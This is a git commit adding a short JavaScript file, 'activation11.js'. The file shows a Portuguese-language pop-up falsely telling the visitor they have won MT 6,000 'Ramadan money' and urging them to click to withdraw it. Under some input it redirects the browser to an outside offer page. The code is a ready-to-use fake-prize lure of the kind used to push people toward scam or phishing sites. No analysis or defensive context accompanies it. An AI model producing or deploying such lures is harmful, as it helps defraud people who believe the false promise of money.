035cdfed3013bccb6357cc769ea44294e5ca3cda
mon-ce <suhailatakoti@gmail.com>
2026-03-02 07:53:23 +0100

    Create activation11.js

---
+++ activation11.js
@@ -0,0 +1,8 @@
+var password = 'SACAR DINHEIRO'
+password = prompt(
+  'Parabéns! Você tem direito a receber MT 6.000. Por favor, clique em OK para SACAR.',
+  'SACAR DINHEIRO'
+);
+if (password != 'SACAR DINHEIRO') {
+  location.href = 'https://offresok.info/MT6000-Ramadao-Dinheiro.html';
+}
